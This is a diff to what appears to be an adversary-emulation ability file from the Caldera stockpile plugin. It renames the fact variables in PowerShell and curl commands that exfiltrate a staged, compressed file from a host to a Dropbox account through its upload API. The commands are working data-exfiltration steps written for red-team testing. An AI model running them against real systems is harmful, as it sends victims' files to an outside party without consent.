@@ -11,10 +11,10 @@
     windows:
       psh:
         command: |
-          $SourceFile = (Get-Item #{host.dir.compress});
+          $SourceFile = (Get-Item #{file.staged_at});
           $RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)";
-          $TargetFilePath = "/#{dropbox.target.dir}/$RemoteName";
-          $ApiKey = "#{dropbox.api.key}";
+          $TargetFilePath = "/#{custom.dropbox_target_dir}/$RemoteName";
+          $ApiKey = "#{custom.dropbox_api_key}";
 
           $url = "https://content.dropboxapi.com/2/files/upload";
 
@@ -49,10 +49,13 @@
           LocalFile='#{host.dir.compress}';
           RemoteName="$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)";
           curl -X POST https://content.dropboxapi.com/2/files/upload
-              --header "Authorization: Bearer #{dropbox.api.key}"
-              --header "Dropbox-API-Arg: {\"path\": \"/#{dropbox.target.dir}/$RemoteName\",\"mode\": \"add\",\"autorename\": true,\"mute\": false,\"strict_conflict\": false}"
+              --header "Authorization: Bearer #{custom.dropbox_api_key}"
+              --header "Dropbox-API-Arg: {\"path\": \"/#{custom.dropbox_target_dir}/$RemoteName\",\"mode\": \"add\",\"autorename\": true,\"mute\": false,\"strict_conflict\": false}"
               --header "Content-Type: application/octet-stream"
-              --data-binary @#{host.dir.compress}
+              --data-binary @#{file.staged_at}
   requirements:
     - plugins.stockpile.app.requirements.paw_provenance:
-        - source: host.dir.compress
+        - source: file.staged_at
+    - plugins.stockpile.app.requirements.basic:
+        - source: file.staged_at
+          edge: is_compressed
